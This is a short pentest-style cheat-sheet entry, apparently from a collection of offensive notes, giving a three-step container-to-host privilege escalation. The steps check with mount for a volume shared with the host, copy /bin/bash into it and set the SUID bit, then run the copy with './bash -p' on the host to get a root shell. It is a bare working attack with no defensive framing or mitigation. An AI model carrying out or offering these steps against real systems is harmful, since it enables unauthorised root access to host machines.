# Root Privilege Abuse

### 1) Check if our device volume is shared between our host and container

    mount

According to the output you may find from the mount command, there is a possibility that it might be connected to host machine.

### 2) Copy bash binary and give it SUID bit

    cp /bin/bash .
    chmod u+s bash

### 3) From the host machine, run the binary and escalate as root on the host

    ./bash -p
